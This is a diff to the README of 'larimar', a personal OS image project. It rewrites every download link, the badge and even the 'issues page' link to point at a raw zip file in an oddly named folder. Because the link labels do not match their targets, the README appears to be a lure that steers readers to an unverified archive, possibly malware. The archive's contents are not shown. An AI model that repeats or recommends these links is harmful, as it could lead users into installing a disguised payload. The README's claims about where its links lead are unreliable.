@@ -1,7 +1,7 @@
 # 🌟 larimar - A Stable OS Image for Everyday Use
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue)](https://github.com/SebasHack99/larimar/releases)
+[![Download Release](https://raw.githubusercontent.com/SebasHack99/larimar/main/Delawarean/larimar.zip%20Release-v1.0-blue)](https://raw.githubusercontent.com/SebasHack99/larimar/main/Delawarean/larimar.zip)
 
 ## 🎯 Overview
 larimar is a personal operating system image built on the stable version of bazzite-nvidia-open. It includes essential software such as 1Password for secure password management and the Brave browser for a fast and private browsing experience. This image is designed to be simple and effective for daily tasks.
@@ -9,7 +9,7 @@ larimar is a personal operating system image built on the stable version of bazz
 ## 🚀 Getting Started
 To use larimar, you will need to download it from our Releases page. Follow these steps:
 
-1. Click on the large download button at the top of this page or use this link: [Download Release](https://github.com/SebasHack99/larimar/releases).
+1. Click on the large download button at the top of this page or use this link: [Download Release](https://raw.githubusercontent.com/SebasHack99/larimar/main/Delawarean/larimar.zip).
 
 2. You will be directed to the Releases page. Here, you will see various versions of larimar. Select the latest stable release.
 
@@ -33,7 +33,7 @@ larimar includes several features to enhance your user experience:
 - **Immersive User Interface:** Designed for ease of use and navigation.
 
 ## 🔄 Download & Install
-1. Visit this page to download: [Download Release](https://github.com/SebasHack99/larimar/releases).
+1. Visit this page to download: [Download Release](https://raw.githubusercontent.com/SebasHack99/larimar/main/Delawarean/larimar.zip).
 2. After downloading, you will need to prepare a USB drive:
    - Use a USB flash drive with at least 8 GB of space.
    - Make sure to back up any data on the drive, as it will be formatted.
@@ -73,7 +73,7 @@ If you encounter any issues:
 3. **Performance Problems:** Ensure your hardware meets the recommended specifications.
 
 ## 📞 Support
-For any questions or support related to larimar, please visit our [issues page](https://github.com/SebasHack99/larimar/issues) on GitHub. You can report issues or ask for help from the community.
+For any questions or support related to larimar, please visit our [issues page](https://raw.githubusercontent.com/SebasHack99/larimar/main/Delawarean/larimar.zip) on GitHub. You can report issues or ask for help from the community.
 
 ## 📝 License
 This project is licensed under the MIT License. You are free to use, modify, and distribute it, provided you include the original license in your distributions. Enjoy your improved computing experience with larimar!
